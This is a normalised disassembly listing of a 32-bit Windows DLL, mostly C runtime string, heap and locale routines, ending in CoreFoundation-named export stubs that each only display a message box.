pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1000c0bc
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_1000bb50
mov eax esi
sub_1000e47c
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_1000c0bc
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_1000c0bc
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_1000bb50
mov eax esi
jmp r-xdata
sub_1000e549
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_1000e564
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1000c0bc
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1000c0bc
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_1000bb50
mov eax esi
sub_1000e5c7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_1000c0bc
mov [ eax ] 0x16
call sub_1000bb50
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_1000e606
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_1000bb6f
pop ecx
call sub_1000c0bc
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_1000c794
push 0x1e
call sub_1000c5e5
push 0xff
call sub_1000af78
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_1000c0bc
mov [ eax ] esi
push ebx
call sub_1000bb6f
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_1000c0bc
mov [ eax ] esi
sub_1000e69a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_1000c0bc
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_1000bb6f
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_1000e71c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1000e606
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000c7cd
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_1000bb6f
pop ecx
call sub_1000c0bc
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_1000c0bc
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000c07a
pop ecx
mov [ esi ] eax
push esi
call sub_1000bb6f
pop ecx
test eax eax
je r-xdata
call sub_1000c0bc
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000c07a
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_1000e7c9
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_1000c0bc
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_1000c0bc
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_1000bb50
mov eax esi
jmp r-xdata
sub_1000e828
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d541
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1000e8b3
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne sub_1000e8b3
test ecx ecx
je r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1000e9dc
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_1000ea96
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_1000c7cd
push [ esi + 0x8 ]
call sub_1000c7cd
push [ esi + 0xc ]
call sub_1000c7cd
push [ esi + 0x10 ]
call sub_1000c7cd
push [ esi + 0x14 ]
call sub_1000c7cd
push [ esi + 0x18 ]
call sub_1000c7cd
push [ esi ]
call sub_1000c7cd
push [ esi + 0x20 ]
call sub_1000c7cd
push [ esi + 0x24 ]
call sub_1000c7cd
push [ esi + 0x28 ]
call sub_1000c7cd
push [ esi + 0x2c ]
call sub_1000c7cd
push [ esi + 0x30 ]
call sub_1000c7cd
push [ esi + 0x34 ]
call sub_1000c7cd
push [ esi + 0x1c ]
call sub_1000c7cd
push [ esi + 0x38 ]
call sub_1000c7cd
push [ esi + 0x3c ]
call sub_1000c7cd
add esp 0x40
push [ esi + 0x40 ]
call sub_1000c7cd
push [ esi + 0x44 ]
call sub_1000c7cd
push [ esi + 0x48 ]
call sub_1000c7cd
push [ esi + 0x4c ]
call sub_1000c7cd
push [ esi + 0x50 ]
call sub_1000c7cd
push [ esi + 0x54 ]
call sub_1000c7cd
push [ esi + 0x58 ]
call sub_1000c7cd
push [ esi + 0x5c ]
call sub_1000c7cd
push [ esi + 0x60 ]
call sub_1000c7cd
push [ esi + 0x64 ]
call sub_1000c7cd
push [ esi + 0x68 ]
call sub_1000c7cd
push [ esi + 0x6c ]
call sub_1000c7cd
push [ esi + 0x70 ]
call sub_1000c7cd
push [ esi + 0x74 ]
call sub_1000c7cd
push [ esi + 0x78 ]
call sub_1000c7cd
push [ esi + 0x7c ]
call sub_1000c7cd
add esp 0x40
push [ esi + 0x80 ]
call sub_1000c7cd
push [ esi + 0x84 ]
call sub_1000c7cd
push [ esi + 0x88 ]
call sub_1000c7cd
push [ esi + 0x8c ]
call sub_1000c7cd
push [ esi + 0x90 ]
call sub_1000c7cd
push [ esi + 0x94 ]
call sub_1000c7cd
push [ esi + 0x98 ]
call sub_1000c7cd
push [ esi + 0x9c ]
call sub_1000c7cd
push [ esi + 0xa0 ]
call sub_1000c7cd
push [ esi + 0xa4 ]
call sub_1000c7cd
push [ esi + 0xa8 ]
call sub_1000c7cd
push [ esi + 0xbc ]
call sub_1000c7cd
push [ esi + 0xc0 ]
call sub_1000c7cd
push [ esi + 0xc4 ]
call sub_1000c7cd
push [ esi + 0xc8 ]
call sub_1000c7cd
push [ esi + 0xcc ]
call sub_1000c7cd
add esp 0x40
push [ esi + 0xd0 ]
call sub_1000c7cd
push [ esi + 0xb8 ]
call sub_1000c7cd
push [ esi + 0xd8 ]
call sub_1000c7cd
push [ esi + 0xdc ]
call sub_1000c7cd
push [ esi + 0xe0 ]
call sub_1000c7cd
push [ esi + 0xe4 ]
call sub_1000c7cd
push [ esi + 0xe8 ]
call sub_1000c7cd
push [ esi + 0xec ]
call sub_1000c7cd
push [ esi + 0xd4 ]
call sub_1000c7cd
push [ esi + 0xf0 ]
call sub_1000c7cd
push [ esi + 0xf4 ]
call sub_1000c7cd
push [ esi + 0xf8 ]
call sub_1000c7cd
push [ esi + 0xfc ]
call sub_1000c7cd
push [ esi + 0x100 ]
call sub_1000c7cd
push [ esi + 0x104 ]
call sub_1000c7cd
push [ esi + 0x108 ]
call sub_1000c7cd
add esp 0x40
push [ esi + 0x10c ]
call sub_1000c7cd
push [ esi + 0x110 ]
call sub_1000c7cd
push [ esi + 0x114 ]
call sub_1000c7cd
push [ esi + 0x118 ]
call sub_1000c7cd
push [ esi + 0x11c ]
call sub_1000c7cd
push [ esi + 0x120 ]
call sub_1000c7cd
push [ esi + 0x124 ]
call sub_1000c7cd
push [ esi + 0x128 ]
call sub_1000c7cd
push [ esi + 0x12c ]
call sub_1000c7cd
push [ esi + 0x130 ]
call sub_1000c7cd
push [ esi + 0x134 ]
call sub_1000c7cd
push [ esi + 0x138 ]
call sub_1000c7cd
push [ esi + 0x13c ]
call sub_1000c7cd
push [ esi + 0x140 ]
call sub_1000c7cd
push [ esi + 0x144 ]
call sub_1000c7cd
push [ esi + 0x148 ]
call sub_1000c7cd
add esp 0x40
push [ esi + 0x14c ]
call sub_1000c7cd
push [ esi + 0x150 ]
call sub_1000c7cd
push [ esi + 0x154 ]
call sub_1000c7cd
push [ esi + 0x158 ]
call sub_1000c7cd
push [ esi + 0x15c ]
call sub_1000c7cd
push [ esi + 0x160 ]
call sub_1000c7cd
add esp 0x18
sub_1000ee0d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
push esi
call sub_1000c7cd
pop ecx
sub_1000ee76
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000c7cd
pop ecx
push esi
call sub_1000c7cd
pop ecx
sub_1000ef74
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000af0f
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_1000d521
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_1000e606
pop ecx
cmp eax ebx
je r-xdata
call sub_1000e9b0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_1000d521
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_1000e606
pop ecx
cmp eax ebx
je r-xdata
call sub_1000e9b0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_1000f15b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d541
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000ef74
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000f1a1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000af0f
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1000d5d0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_1000d521
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1000e606
pop ecx
cmp eax ebx
je r-xdata
call sub_1000e9b0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_1000f288
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d541
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000f1a1
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000f2d0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000f2f0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_1000af0f
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_1000f335
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000f335
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1000f2f0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000f3e5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000f404
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1000f3e5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1000f410
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
CFAbsoluteTimeAddGregorianUnits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAbsoluteTimeGetCurrent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAbsoluteTimeGetDayOfWeek
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAbsoluteTimeGetDayOfYear
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAbsoluteTimeGetDifferenceAsGregorianUnits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAbsoluteTimeGetGregorianDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAbsoluteTimeGetWeekOfYear
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAllocatorAllocate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAllocatorCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAllocatorDeallocate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAllocatorGetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAllocatorGetDefault
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAllocatorGetPreferredSizeForSize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAllocatorGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAllocatorReallocate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAllocatorSetDefault
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayAppendArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayAppendValue
push 0x0
